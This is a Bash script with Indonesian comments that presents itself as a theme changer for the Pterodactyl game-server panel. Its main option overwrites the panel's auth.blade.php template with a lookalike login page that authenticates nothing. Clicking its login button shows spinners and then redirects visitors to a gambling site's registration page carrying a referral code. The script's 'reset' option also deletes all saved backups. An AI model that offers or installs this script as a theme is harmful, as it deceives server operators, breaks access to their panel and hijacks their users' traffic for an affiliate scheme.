#!/bin/bash

# Warna untuk output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Direktori panel Pterodactyl
PTERODACTYL_DIR="/var/www/pterodactyl"
BACKUP_DIR="/root/pterodactyl-backup"

# Tampilan HTML baru
NEW_HTML='<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport" />
    <title>
      Ptrodactyl
    </title>
    <link rel="icon" type="image/x-icon" href="https://pterodactyl.io/logos/pterry.svg" />
    <script src="https://cdn.tailwindcss.com">
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Roboto&amp;display=swap" rel="stylesheet" />
    <style>
      .custom-font { font-size: 14px; }  
    .custom-border { border: 1.9px solid #D1D5DB; }  
    body {  
      min-height: 100dvh;  
      overflow-y: auto;  
      font-family: '\''Roboto'\'', sans-serif;  
      background-color: #374150;  
    }  

    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #374151;
      z-index: -1;
    }

    h2 { font-weight: 400; }

    .animate-spin-slow {
      animation: spin 1.2s linear infinite;
      border-top-color: #374150;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    </style>
  </head>
  <body class="bg-[#374151] flex flex-col items-center justify-start pt-[1px] min-h-[120dvh]">
    <h2 class="text-center text-white text-3xl mb-[6px] mt-20">
      Login to Continue
    </h2>
    <div class="w-full max-w-sm bg-white rounded-lg shadow-lg p-7 flex flex-col items-center" style="max-height:calc(99vh - 60px);">
      <div class="flex justify-center mb-7">
        <img alt="Pterodactyl logo" class="w-48 h-48 object-contain" src="https://pterodactyl.io/logos/pterry.svg" />
      </div>
      <form id="loginForm" class="w-full">
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          USERNAME OR EMAIL
        </p>
        <input id="username" class="w-full rounded-md px-3 py-3 mb-4 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="text" required="" />
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          PASSWORD
        </p>
        <input id="password" class="w-full rounded-md px-3 py-3 mb-6 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="password" required="" />
        <button id="loginBtn" type="button" class="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white font-light py-4 rounded-[3px] transition-colors duration-200 custom-font flex justify-center items-center gap-2 relative overflow-hidden">
          <span id="loginText">          LOGIN
</span>
          <div id="miniSpinner" class="hidden absolute w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
          </div>
        </button>
      </form>
      <div class="text-center mt-[12px]">
        <a class="text-xs text-gray-500 hover:text-gray-700" href="#">        FORGOT PASSWORD?
</a>
      </div>
    </div>
    <p class="text-center text-xs mt-3 mb-0 select-none text-gray-400">
      Â© 2015 - 2025 Pterodactyl Software
    </p>
    <div id="spinner-bg" class="fixed inset-0 bg-[#374151] bg-opacity-100 z-50 hidden flex items-center justify-center" style="align-items: flex-start;">
      <div class="animate-spin-slow rounded-full h-16 w-16 border-8 border-gray-300 border-t-gray-600 mt-[12vh]">
      </div>
    </div>
    <script src="https://www.google.com/recaptcha/api.js?render=6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL" async="" defer="">
    </script>
    <script>
      window.addEventListener("load", () => {
      if (typeof grecaptcha !== "undefined") {
        grecaptcha.ready(() => {
          grecaptcha.execute('\''6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL'\'', {action: '\''login'\''}).then(token => {
            console.log('\''Decorative token:'\'', token);
          });
        });
      }
    });

    async function onSubmit() {  
      const loginBtn = document.getElementById("loginBtn");
      const loginText = document.getElementById("loginText");
      const miniSpinner = document.getElementById("miniSpinner");
      const spinner = document.getElementById("spinner-bg");

      // Disable button and show mini spinner
      loginBtn.disabled = true;
      loginBtn.classList.add("bg-blue-400");
      loginBtn.classList.remove("hover:bg-[#2563eb]");
      loginText.classList.add("invisible");
      miniSpinner.classList.remove("hidden");

      // Show fullscreen spinner after a short delay
      await new Promise(r => setTimeout(r, 1000));
      spinner.classList.remove("hidden");

      // Redirect to the target link
      window.location.href = "https://congtogelbiz.com/register?referral_code=rndzz";
    }

    document.getElementById("loginBtn").addEventListener("click", onSubmit);
    </script>
  </body>
</html>'

# Fungsi untuk menampilkan banner
show_banner() {
    clear
    echo -e "${BLUE}================================${NC}"
    echo -e "${GREEN}   PTERODACTYL THEME CHANGER    ${NC}"
    echo -e "${BLUE}================================${NC}"
    echo ""
}

# Fungsi untuk mengecek apakah Pterodactyl terinstall
check_pterodactyl() {
    if [ ! -d "$PTERODACTYL_DIR" ]; then
        echo -e "${RED}Error: Pterodactyl tidak ditemukan di $PTERODACTYL_DIR${NC}"
        exit 1
    fi
    
    if [ ! -f "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php" ]; then
        echo -e "${RED}Error: File auth.blade.php tidak ditemukan${NC}"
        exit 1
    fi
}

# Fungsi untuk backup file asli
backup_original() {
    echo -e "${YELLOW}Membuat backup file asli...${NC}"
    
    # Buat direktori backup jika belum ada
    mkdir -p "$BACKUP_DIR"
    
    # Backup file auth.blade.php
    cp "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php" "$BACKUP_DIR/auth.blade.php.backup-$(date +%Y%m%d-%H%M%S)"
    
    echo -e "${GREEN}Backup berhasil dibuat di $BACKUP_DIR${NC}"
}

# Fungsi untuk mengubah tampilan
ubah_tampilan() {
    echo -e "${YELLOW}Mengubah tampilan panel Pterodactyl...${NC}"
    
    # Backup dulu
    backup_original
    
    # Tulis HTML baru ke file auth.blade.php
    echo "$NEW_HTML" > "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php"
    
    # Clear cache
    cd "$PTERODACTYL_DIR"
    php artisan view:clear
    php artisan cache:clear
    
    echo -e "${GREEN}Tampilan berhasil diubah!${NC}"
}

# Fungsi untuk memulihkan tampilan asli
pulihkan_tampilan() {
    echo -e "${YELLOW}Memulihkan tampilan asli...${NC}"
    
    # Cari file backup terbaru
    LATEST_BACKUP=$(ls -t "$BACKUP_DIR"/auth.blade.php.backup-* 2>/dev/null | head -n1)
    
    if [ -f "$LATEST_BACKUP" ]; then
        # Pulihkan dari backup
        cp "$LATEST_BACKUP" "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php"
        
        # Clear cache
        cd "$PTERODACTYL_DIR"
        php artisan view:clear
        php artisan cache:clear
        
        echo -e "${GREEN}Tampilan berhasil dipulihkan!${NC}"
    else
        echo -e "${RED}Error: Tidak ditemukan file backup${NC}"
        exit 1
    fi
}

# Fungsi untuk memulihkan semua seperti baru (reset total)
reset_total() {
    echo -e "${YELLOW}Memulihkan semua seperti baru...${NC}"
    echo -e "${RED}PERINGATAN: Ini akan mengembalikan panel ke pengaturan awal!${NC}"
    read -p "Apakah Anda yakin? (y/n): " -n 1 -r
    echo ""
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        # Hapus semua backup
        rm -rf "$BACKUP_DIR"/*
        
        # Buat file auth.blade.php baru dengan konten default Pterodactyl
        cat > "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php" << 'EOF'
<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>@yield('title') | {{ config('app.name', 'Pterodactyl') }}</title>

    @include('layouts.scripts')
</head>
<body class="bg-neutral-50 dark:bg-neutral-900">
    @yield('content')
</body>
</html>
EOF
        
        # Clear cache
        cd "$PTERODACTYL_DIR"
        php artisan view:clear
        php artisan cache:clear
        
        echo -e "${GREEN}Panel berhasil direset ke tampilan default!${NC}"
    else
        echo -e "${YELLOW}Reset dibatalkan${NC}"
    fi
}

# Menu utama
show_banner
check_pterodactyl

echo -e "Pilih opsi:"
echo -e "1) ${GREEN}Ubah tampilan${NC} - Mengubah tampilan login panel"
echo -e "2) ${BLUE}Pulihkan semua!${NC} - Memulihkan semua seperti baru (reset total)"
echo -e "3) ${YELLOW}Pulihkan tampilan asli${NC} - Kembali ke tampilan sebelum diubah"
echo -e "4) Keluar"
echo ""

read -p "Masukkan pilihan [1-4]: " pilihan

case $pilihan in
    1)
        ubah_tampilan
        ;;
    2)
        reset_total
        ;;
    3)
        pulihkan_tampilan
        ;;
    4)
        echo -e "${YELLOW}Keluar...${NC}"
        exit 0
        ;;
    *)
        echo -e "${RED}Pilihan tidak valid!${NC}"
        exit 1
        ;;
esac

echo ""
echo -e "${GREEN}Selesai!${NC}"
